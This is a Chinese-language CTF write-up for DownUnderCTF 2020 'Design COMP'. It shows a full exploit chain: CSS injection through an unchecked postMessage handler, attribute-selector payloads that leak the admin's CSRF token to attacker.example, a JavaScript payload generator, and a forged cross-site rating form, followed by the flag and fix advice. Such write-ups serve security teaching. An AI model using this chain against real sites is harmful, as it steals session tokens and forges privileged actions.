# DownUnderCTF 2020 - Design COMP

## 题目简述

用户提交主页设计链接后，管理员机器人会依次登录、访问提交页面，并给当前用户默认评分 8。只有评分达到 10 才显示 flag。用户的 playground 接受任意来源的 `postMessage`，把其中的 CSS 写入 `<style>`；管理员评分表单又在 DOM 中携带 24 位十六进制 CSRF token。利用 CSS 属性选择器可通过外带请求逐段泄露 token，再从攻击页面发起带 token 的跨站评分请求。

## 解题过程

playground 的消息处理器没有验证 `evt.origin`：

```javascript
window.addEventListener('message', evt => {
    style.textContent = evt.data.css;
    localStorage.setItem('css', evt.data.css);
});
```

管理员访问时，页面包含：

```html
<form id="rater">
  <input type="hidden" name="csrf" value="<24 hex chars>">
  <input type="number" name="score">
  <input type="submit" value="Rate">
  <p class="feedback"></p>
</form>
```

攻击页面打开管理员上下文中的 `/playground/<自己的用户 ID>`，再向 iframe 发送 CSS。CSS 属性选择器可以判断 token 的前缀或后缀；条件匹配时，给相邻的可见元素设置攻击服务器 URL，浏览器便发出可观察的请求：

```css
#rater, #rater * { display: block !important; }

[name="csrf"][value^="ab"] + * {
  background: url(https://attacker.example/Aab) !important;
}

[name="csrf"][value$="ef"] ~ p {
  background: url(https://attacker.example/Zef) !important;
}
```

不能直接给 `type=hidden` 的 input 加背景图，因为隐藏元素不会渲染；所以 payload 根据 token 值匹配该 input，却把 `background` 施加到相邻兄弟元素。攻击端枚举十六进制字符集 `0123456789abcdef`，观察 `/A...` 与 `/Z...` 请求，逐轮扩展已知前缀和后缀。官方 exploit 每轮枚举两个字符的笛卡尔积以减少往返：

```javascript
const charset = '0123456789abcdef'.split('');

function candidates2() {
  return charset.flatMap(a => charset.map(b => a + b));
}

function buildCss(front, back) {
  const prefixRules = candidates2().map(s =>
    `[name="csrf"][value^="${front+s}"]+*{` +
    `background:url(${self}/A${front+s})!important}`
  );
  const suffixRules = candidates2().map(s =>
    `[name="csrf"][value$="${s+back}"]~p{` +
    `background:url(${self}/Z${s+back})!important}`
  );
  return '#rater,#rater *{display:block!important}' +
         prefixRules.join('') + suffixRules.join('');
}

frame.contentWindow.postMessage({css: buildCss(front, back)}, '*');
```

拿到完整 token 后，攻击页面提交跨站表单。字段 `user` 填自己的 UUID，`score` 填 10，`csrf` 填泄露值：

```html
<form method="POST" action="https://target.example/admin/rate">
  <input name="csrf" value="<leaked-token>">
  <input name="user" value="<our-user-id>">
  <input name="score" value="10">
</form>
```

管理员会话 cookie 配置为 `SameSite=None; Secure`，因此该跨站表单会携带管理员会话；正确 token 又通过应用的 CSRF 检查，最终把自己的评分写成 10。回到 `/me` 得到：

```text
DUCTF{wh0_neEd5_xSS_Wh3n_Y0u_h4ve_Cs5_81d399f9}
```

## 方法总结

CSS 注入即使不能执行 JavaScript，仍可用属性选择器和 `url()` 建立数据外带信道。本题还依赖三个条件：`postMessage` 未校验来源、敏感 token 出现在可选择的 DOM 属性中、管理员 cookie 允许跨站请求。修复时需要同时校验消息 origin、缩小管理员页面暴露面，并让评分接口使用不进入 DOM 的一次性 CSRF 防护。
